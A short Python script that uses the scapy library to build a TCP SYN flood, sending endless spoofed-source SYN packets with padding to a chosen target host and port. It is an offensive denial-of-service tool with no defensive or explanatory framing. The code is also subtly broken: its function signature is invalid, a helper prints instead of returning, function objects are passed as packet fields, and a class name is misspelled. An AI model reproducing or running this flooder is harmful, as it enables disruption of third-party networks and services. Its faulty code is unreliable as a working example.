from scapy.all import *
import os
import sys
import random
from colorama import Fore

def random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def random_port():
    print(random.randrange(65535))

def syn_flood(source=random_ip, target, tgt_port=random_port, v=0):
    ip = IP(src=source, dst=target)
    tcp = TCP(sport=random_port, dport=tgt_port, flags="S")
    raw_pkt = RAW(b"X"*1024)
    pkt = ip/tcp/raw_pkt
    print(f"{Fore.GREEN}Flooding the target...")

    send(pkt, loop=1, verbose=v)
